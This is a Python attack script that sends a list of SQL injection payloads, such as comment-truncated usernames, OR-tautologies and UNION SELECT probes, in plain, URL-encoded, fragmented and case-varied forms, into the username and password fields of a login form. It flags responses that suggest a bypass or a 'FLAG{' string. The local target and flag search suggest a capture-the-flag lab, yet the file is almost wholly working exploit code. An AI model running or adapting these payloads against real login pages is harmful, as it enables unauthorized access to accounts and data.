import requests
import urllib.parse
import time
import re
import sys

def generate_compact_payloads():
    """Generate optimized payload set with most promising mutations"""
    payloads = []
    
    # Most effective classic payloads (no encoding needed for these first)
    core_payloads = [
        "admin'--",
        "admin' #",
        "' OR '1'='1",
        "' OR 1=1--",
        'admin"--',
        '" OR ""="',
        "admin' OR '1'='1",
        "' UNION SELECT 1,2,3--",
        "' UNION SELECT 1,@@version,3--",
        "admin'/*",
        "admin'-- -",
        "admin' OR 1=1#",
        "' OR 'a'='a'--",
        "') OR '1'='1--",
        "`admin`--",
        "ad'||'min",
        "ad' min"
    ]
    
    # URL encoded variants of the most promising ones
    url_encoded = [
        urllib.parse.quote("admin'--", safe=''),
        urllib.parse.quote("' OR '1'='1", safe=''),
        urllib.parse.quote("' OR 1=1--", safe=''),
        urllib.parse.quote("admin' #", safe=''),
        urllib.parse.quote_plus("admin'--"),
        urllib.parse.quote_plus("' OR '1'='1"),
    ]
    
    # Fragmented comment versions
    fragmented = [
        "ad'/**/min'--",
        "'/**/OR/**/'1'='1",
        "admin'/**/or/**/'1'='1",
        "ad'min'--",
    ]
    
    # Case variations
    case_variations = [
        "AdMiN'--",
        "' OR '1'='1",
        "' oR '1'='1",
    ]
    
    # Add all payloads with metadata
    for payload in core_payloads:
        payloads.append({'payload': payload, 'type': 'plain', 'raw': payload})
    
    for payload in url_encoded:
        payloads.append({'payload': payload, 'type': 'url_encoded', 'raw': urllib.parse.unquote(payload)})
    
    for payload in fragmented:
        payloads.append({'payload': payload, 'type': 'fragmented', 'raw': payload})
    
    for payload in case_variations:
        payloads.append({'payload': payload, 'type': 'case', 'raw': payload})
    
    return payloads

def test_single_payload(target_url, field, payload_data, test_num):
    """Test a single payload with robust error handling"""
    payload = payload_data['payload']
    payload_type = payload_data['type']
    raw_payload = payload_data['raw']
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive'
    }
    
    # Prepare data based on field
    if field == 'username':
        data = f"username={payload}&password=testpass123"
    else:
        data = f"username=testuser123&password={payload}"
    
    result = {
        'test_num': test_num,
        'field': field,
        'payload': payload[:100],  # Truncate for display
        'raw_payload': raw_payload,
        'payload_type': payload_type,
        'status_code': None,
        'content_length': 0,
        'has_admin': False,
        'has_flag': False,
        'has_welcome': False,
        'has_dashboard': False,
        'has_logout': False,
        'has_error': False,
        'redirect_to': '',
        'has_cookie': False,
        'success': False,
        'error': ''
    }
    
    try:
        # Try with timeout and verify=False for reliability
        response = requests.post(
            target_url,
            headers=headers,
            data=data,
            timeout=15,
            allow_redirects=False,
            verify=False
        )
        
        # Check response content for indicators
        content_lower = response.text.lower()
        result['status_code'] = response.status_code
        result['content_length'] = len(response.content)
        result['has_admin'] = 'admin' in content_lower
        result['has_flag'] = 'flag' in content_lower or 'FLAG{' in response.text
        result['has_welcome'] = 'welcome' in content_lower
        result['has_dashboard'] = 'dashboard' in content_lower
        result['has_logout'] = 'logout' in content_lower
        result['has_error'] = 'error' in content_lower or 'syntax' in content_lower
        result['redirect_to'] = response.headers.get('Location', '')
        result['has_cookie'] = len(response.cookies) > 0
        
        # Mark as success if any positive indicator found
        result['success'] = (
            result['has_admin'] or 
            result['has_flag'] or 
            result['has_welcome'] or
            result['has_dashboard'] or
            result['has_logout'] or
            result['has_cookie'] or
            (response.status_code in [301, 302, 303, 307, 308])
        )
        
        # Print interesting results immediately
        if result['success'] or result['has_error']:
            print(f"\n{'='*70}")
            print(f"[INTERESTING RESULT #{test_num}] - {field.upper()} field")
            print(f"{'='*70}")
            print(f"Payload Type: {payload_type}")
            print(f"Raw Payload: {raw_payload}")
            print(f"Encoded Payload: {payload[:80]}")
            print(f"Status Code: {response.status_code}")
            print(f"Content Length: {len(response.content)} bytes")
            print(f"Indicators: admin={result['has_admin']}, flag={result['has_flag']}, welcome={result['has_welcome']}")
            print(f"            dashboard={result['has_dashboard']}, logout={result['has_logout']}, cookie={result['has_cookie']}")
            if result['redirect_to']:
                print(f"Redirect To: {result['redirect_to']}")
            
            # Print response snippet if small or contains flag
            if result['has_flag'] or len(response.text) < 1000:
                print(f"\nResponse:\n{'-'*50}")
                print(response.text[:1000])
                print(f"{'-'*50}")
        
    except requests.exceptions.Timeout:
        result['error'] = 'Timeout'
        print(f"[TIMEOUT] Test #{test_num} - {field} field - {raw_payload}")
    except requests.exceptions.ConnectionError as e:
        result['error'] = f'Connection Error: {str(e)[:50]}'
        print(f"[CONNECTION ERROR] Test #{test_num} - {field} field")
    except Exception as e:
        result['error'] = f'Unexpected Error: {str(e)[:50]}'
        print(f"[ERROR] Test #{test_num} - {field} field: {str(e)[:50]}")
    
    return result

def main():
    target_url = "http://127.0.0.1:33148/login"
    
    print("="*80)
    print("SQL INJECTION AUTH BYPASS TESTING")
    print("="*80)
    print(f"Target: {target_url}\n")
    
    # Generate payloads
    print("Generating optimized SQL injection payloads...")
    try:
        payloads = generate_compact_payloads()
        print(f"Generated {len(payloads)} payload variants\n")
    except Exception as e:
        print(f"Error generating payloads: {e}")
        return
    
    # Test all payloads
    results = []
    total_tests = len(payloads) * 2  # Test each payload in both fields
    print(f"Starting tests: {total_tests} total combinations\n")
    
    success_count = 0
    error_count = 0
    
    for test_num, payload_data in enumerate(payloads):
        # Test in username field
        result_u = test_single_payload(target_url, 'username', payload_data, test_num)
        results.append(result_u)
        
        if result_u['success']:
            success_count += 1
        if result_u['error']:
            error_count += 1
        
        # Test in password field
        result_p = test_single_payload(target_url, 'password', payload_data, test_num + 1000)
        results.append(result_p)
        
        if result_p['success']:
            success_count += 1
        if result_p['error']:
            error_count += 1
        
        # Progress indicator
        if test_num % 10 == 0 and test_num > 0:
            print(f"\n[PROGRESS] Completed {test_num}/{len(payloads)} payload sets...")
            print(f"           Successes: {success_count} | Errors: {error_count}\n")
        
        # Rate limiting
        time.sleep(0.2)
    
    # Final summary
    print("\n" + "="*80)
    print("FINAL SUMMARY")
    print("="*80)
    print(f"Total tests completed: {len(results)}")
    print(f"Successful injections: {success_count}")
    print(f"Failed/Errors: {error_count}")
    
    # Show best results
    successful_results = [r for r in results if r['success']]
    
    if successful_results:
        print("\n[TOP SUCCESSFUL PAYLOADS]")
        for idx, result in enumerate(successful_results[:10], 1):
            print(f"\n{idx}. {result['field']} field - Type: {result['payload_type']}")
            print(f"   Raw: {result['raw_payload']}")
            print(f"   Status: {result['status_code']} | Admin: {result['has_admin']} | Flag: {result['has_flag']}")
            print(f"   Welcome: {result['has_welcome']} | Dashboard: {result['has_dashboard']} | Logout: {result['has_logout']}")
    else:
        print("\n[RESULT] No successful authentication bypasses detected")
    
    # Check specifically for flags
    flag_results = [r for r in results if r['has_flag']]
    if flag_results:
        print(f"\n[!] FLAG INDICATORS FOUND in {len(flag_results)} responses!")
        for fr in flag_results:
            print(f"   Test #{fr['test_num']} in {fr['field']} field with: {fr['raw_payload']}")
    
    # Error summary
    if error_count > 0:
        print(f"\n[WARNING] {error_count} connection errors occurred")
        print("          Check if target server is accessible and stable")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[!] Testing interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"\n\n[!] Fatal error: {str(e)}")
        sys.exit(1)

